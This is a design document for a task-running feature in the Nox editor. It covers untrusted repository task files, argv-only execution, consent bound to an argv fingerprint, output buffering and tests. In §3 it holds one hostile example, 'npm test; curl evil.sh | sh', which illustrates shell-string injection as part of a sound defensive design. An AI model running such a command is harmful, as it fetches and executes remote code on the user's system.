# Tasks: design

Run a project's own commands from the editor and keep their output. The last
unshipped row of the v0.6 table, and the one that has to answer a question the
five before it were able to refuse.

Status: decided 2026-08-30. Every file named below was read in the tree at
`8761862`, and every claim about an existing rule quotes the file that states
it.

## 0. The rule this feature walks into

The row in `ROADMAP.md:135` is one line: **"Tasks. Run project commands,
capture output."** Three words of it are the whole problem, and they are
*project*, *commands* and *run*.

Nox has taken the same position twice, in writing, and both times on purpose:

> `.nox/settings.json` arrives with a cloned repository, and the schema's
> `workspace: true` allowlist works because Nox knows what each of its eight
> keys means. It cannot know what a plugin's keys mean, since `formatter.path`
> and `margin.width` are both a string with a label, so no plugin setting is
> ever workspace-scoped.
>
> `src/services/plugin/settings.ts:19-27`, and again at
> `src/core/plugin-manifest.ts:79-83`

and the allowlist itself says why it exists:

> Only facts about the *code* belong here (its indentation, what it excludes,
> whether it formats on save), never a fact about the person reading it, and
> never anything naming a program, a path or an address. `terminal.shell` is
> the reason this list exists.
>
> `src/services/config/schema.ts:20-29`

A `tasks.json` inside a repository is, exactly and unavoidably, a file that
names a program to run and arrives with a clone. So this feature cannot be
built the way every other editor builds it, and it cannot be built by quietly
dropping the word *project* either, because that word is the row.

**The distinction that resolves it is not what the file names, it is when the
naming takes effect.** `terminal.shell` from a repository is dangerous because
it applies the instant you open a terminal, invisibly, having never been read
by anyone. A task is different in kind: it does nothing until a person asks for
it by name, which means there is a moment, before anything runs, at which Nox
can show precisely what is about to be executed. Consent has somewhere to go.

That moment is the whole design. Everything below either creates it or
protects it.

## 1. Where the permission model is, and why it is not here

`PermissionService` is the obvious home for this and it is the wrong one.

`CommandRegistry.execute` guards on `principal.kind !== 'user'`
(`src/services/commands.ts:200`), and `AGENT-PLATFORM.md:265-267` argues the
exemption rather than assuming it:

> **The user is exempt, and not even logged.** A model that can interrupt a
> human mid-keystroke is a model they turn off within a day, and a permission
> layer nobody runs protects nothing.

That is correct, and it means the permission model answers *"may this agent
make Nox do something"*. The question here is the other one: **"is this thing
Nox is about to run actually the user's, or did it arrive with the
repository?"** The principal is the user in both cases. Making the user
non-exempt to catch this would trade a rule the codebase has argued for
against a threat it was never aimed at.

So `shell.exec` keeps its meaning and its `deny` default
(`permissions.ts:95-107`), the task commands declare it so an agent or plugin
reaching for them is refused exactly as before, and the *user's* protection is
a separate, smaller thing that lives in the service: a trust record, described
in §4.

## 2. Two sources, not one

| File | Whose | Trusted |
|---|---|---|
| `<config>/tasks.json` | yours | yes, on sight |
| `<root>/.nox/tasks.json` | the repository's | no, until confirmed |

The user-level file is the same standing `servers.json` and `agents.json`
already have: you wrote it, in your own configuration directory, and Nox does
not second-guess a program you named yourself. README §Status already makes
that promise for language servers ("Nox never starts a server you did not list
there") and this keeps it.

The project file is read, listed, and inert until §4 lets it run.

Both files are the same shape, so a task can be moved from one to the other by
moving the lines, which is the migration path for "this repository's task is
fine, I want it to stop asking". Where both files define the same task id, the
user's wins and the project's is listed as shadowed rather than dropped
silently: a repository must not be able to take over the name of a task you
already trusted, and finding out by having yours vanish is worse than being
told.

## 3. argv, never a shell

```json
{
  "tasks": [
    { "id": "test", "label": "Run tests", "command": "npm", "args": ["test"] },
    { "id": "check", "command": "npm", "args": ["run", "check"] }
  ]
}
```

A task is a `command` and an `args` array. There is no `shell` field, no
string form that gets split, and nothing is ever handed to `sh -c`.

This follows the house everywhere it already spawns something:
`AgentProcessSpec` is `{ command, args?, cwd? }` (`platform/types.ts:112-117`),
`LanguageServerSpec` is the same, and `git.rs` runs "six argv-fixed git
commands, never a shell" (`ROADMAP.md:113`). The one place a shell *is* the
point is the terminal, and there it is the product rather than an
implementation detail.

**Two things fall out, and the second is the reason.**

It costs real expressiveness. `npm test && npm run lint` is not a task; it is
two. `cargo build 2>&1 | tee log` is not a task at all. The honest answer for
those is the terminal, which is one chord away and is a shell on purpose.

And it is what makes the confirmation in §4 *true*. If a task could carry a
shell string, the dialog would be showing you a string that the shell then
reinterprets: `npm test; curl evil.sh | sh` reads as a test run at a glance,
and quoting, expansion, substitution and globbing all get a say after you have
clicked. With argv there is no second reader. What the dialog prints is what
`execve` receives, element for element. A confirmation you cannot fully trust
is worse than none, because it launders the thing it was supposed to check.

`cwd` is not settable by a task. It is the workspace root, always. A task that
could name its own directory could name `/`, and the field buys nothing a task
in the right repository needs.

## 4. Consent binds to the argv, not to the name

The first time a **project** task is asked to run, Nox shows what it is about
to execute (`ui.confirm`, the existing dialog) with the command and every
argument, says the task came from the repository rather than from the user's
own file, and runs nothing unless the answer is yes.

**The record it keeps is keyed on a fingerprint of the exact argv, not on the
task's id.** That is the load-bearing half. Keying on the name would let a
repository earn a yes for `test` meaning `npm test`, then change the file (a
pull, a branch switch, a watcher-driven reload, none of which the user is
looking at) and inherit the approval for something else under a name already
trusted.
Fingerprinting the argv means any edit to what a task runs is a new question.
The fingerprint is `command` and `args` joined with a NUL, which no argv
element can contain, so no two distinct argvs can collide by construction.

**Trust lasts the session and is not written to disk.** This is the same
granularity `PermissionService` offers for "allow for this session"
(`AGENT-PLATFORM.md:277-283`) and it is chosen for the same reason: a grant
that outlives the window it was given in is a grant nobody remembers giving. A
persisted trust file is a bigger feature (it needs a scope, a viewer and a way
to withdraw one entry) and it is not needed to ship the row.

**A grant you cannot see is a grant you cannot withdraw**, so the panel lists
what is currently trusted, and **Forget Approved Tasks** clears it. That
sentence is `AGENT-PLATFORM.md:275` and it applies unchanged.

The user's own tasks never prompt. They are not a threat model; they are a
file only the user can write, in a directory only the user's own tools reach.

## 5. Running one

A task runs as a **job** (`services/jobs.ts`), and the job's body owns a
process spawned through `Platform.spawnAgent`.

Nothing new is needed at the platform boundary, which is the happiest finding
in this design. `spawnAgent` is already a generic "start a child, stream its
stdout and stderr as lines, tell me when it exits, let me kill it"
(`platform/types.ts:126-145`). Its name is narrower than its contract and the
plugin API already borrows it for exactly this reason
(`services/plugin/discover.ts:105-122` calls it for a `process` transport).
Tasks is the third caller.

Three properties come from the job runner rather than being written again:

- **Cancellation is real.** `JobContext.onCancel` fires immediately if
  cancellation already happened (`jobs.ts:140-143`), which closes the window
  between `spawnAgent` starting and the handle coming back. **Stop Task**
  cannot miss a process that was mid-spawn.
- **Keyed supersession** (`jobs.ts:118-121`) gives "running a task again stops
  the previous run of that task" for free, keyed on the task id, with no
  generation counter to get wrong.
- `result` never rejects, and the outcome is a union
  (`jobs.ts:47-50`), so the panel cannot forget that cancelled is not failed.

The one rule the job runner states that this feature must not break is
`AGENT-PLATFORM.md:317-320`: **a job never mutates a buffer.** A task run never
touches one. It collects output and an exit code, and that is all it produces.

## 6. Output is bounded, and bounded by lines

Output is kept in the service, in a ring buffer of **5,000 lines per task**,
oldest dropped. It is not kept in the component, because
`TerminalService` deliberately does not keep output at all
(`services/terminal.ts:4-15`), where scrollback belongs to xterm.js, and a
task's output has to outlive the panel being closed, which is the case that
rule does not cover.

A cap rather than a setting, for the reason blame's `MAX_BLAME_BYTES` is a
constant: it is a bound that keeps the editor honest, not a preference anyone
has an opinion about. A build that prints a million lines must not be able to
grow the renderer's heap without limit, and the alternative to dropping the
oldest is dropping the newest, which throws away the part with the error in it.

Lines rather than bytes because `AgentProcess` hands over lines
(`agent.rs:325`'s `read_lines` is "the one reader behind every piped stream Nox
supervises"), and re-deriving a byte budget from them would be counting the
same thing twice.

**stdout and stderr are interleaved in arrival order and tagged**, not kept in
two lists. A compiler writes its errors to stderr and its progress to stdout,
and showing them apart puts the error somewhere other than the step it belongs
to. The tag is kept so the panel can dim one, and so a later "jump to the
error" feature has something to filter on.

## 7. Where it draws

A panel in the **editor area**, the fifth in the slot that already holds
review, agents, diff and welcome (`ui/App.svelte:145-161`).

Not the sidebar. The agents panel's own comment settles it
(`services/ui.ts:161-164`): "an audit trail of what a session read and ran
needs the width, and it wrapped to nonsense in a 200px sidebar." Task output is
that content exactly.

Not the bottom, beside the terminal, which is where it would go in a bigger
editor and is where it would go here on a second pass. There is no bottom-panel
container: `App.svelte:166-171` renders `TerminalPanel` and nothing else, with
no tab strip and no second slot. Building one is a layout feature in its own
right, and doing it as a side effect of this row would make a change about
running commands into a change about how panels stack. Recorded as debt in §9
instead.

Being the fifth panel in that slot costs three lines in each of the four
existing `show*` methods and one branch in `dismissTop`. That N-by-N growth is
now visible enough to name, and §9 names it.

## 8. Surface

| Command | Id | |
|---|---|---|
| Run Task… | `tasks.run` | Picker of every task, user's and project's, shadowed ones marked |
| Run Last Task | `tasks.runLast` | `Mod+Shift+B`, the one chord this feature asks for |
| Stop Task | `tasks.stop` | Cancels the running job |
| Show Tasks | `tasks.show` | Opens the panel |
| Edit Tasks | `tasks.edit` | Creates `<config>/tasks.json` with a worked example and opens it |
| Forget Approved Tasks | `tasks.forgetTrust` | Drops every session approval from §4 |

All six declare `capabilities: ['shell.exec']` except `tasks.show` and
`tasks.edit`, which open a panel and a file. `shell.exec` is `deny` by default
for non-user principals, so an agent asking Nox to run a task is refused
without a prompt, which is the existing policy and the right one.

`tasks.edit` writes the **user's** file, never the project's. Nox offering to
author a file that arrives with a repository would be Nox helping to create the
thing §0 is about.

## 9. What this does not do, deliberately

- **No shell.** §3. The terminal is the answer, and it is one chord away.
- **No task-runner autodetection.** Nox does not read `package.json` scripts or
  `Makefile` targets and offer them. Every one of those is a program named by
  the repository, so autodetection is §0's problem with a friendlier face and
  no confirmation attached to it.
- **No `dependsOn`, no task chaining, no background/watch tasks.** A task
  starts, prints and exits.
- **No problem matchers.** Output is text. Turning `src/a.ts:3:9: error` into a
  row in the Problems panel needs a pattern language per toolchain, and the
  panel it would populate belongs to the language servers today.
- **Trust is not persisted.** §4.
- **The output panel is not the bottom panel.** §7.

## 10. Verifying

The service and the parser run headless: a `MemoryPlatform` subclass supplies a
fake process, which is how `tests/agent-spawn-cwd.test.ts` already observes a
spawn (`platform/memory.ts:1003-1006` keeps `spawnAgent`'s return type the
interface's rather than `never` precisely so a subclass can override it).

What the tests must hold, beyond the parser:

1. A project task does not run until confirmed.
2. Editing what a confirmed project task runs asks again. **This is the one
   that matters**, and it is the test that would have caught keying trust on
   the name.
3. A user task never asks.
4. A user task shadows a project task of the same id, and the project one is
   reported as shadowed rather than dropped.
5. Cancelling kills the process, including when cancellation lands during the
   spawn.
6. The ring buffer drops the oldest line and keeps the newest.
7. stdout and stderr interleave in arrival order.
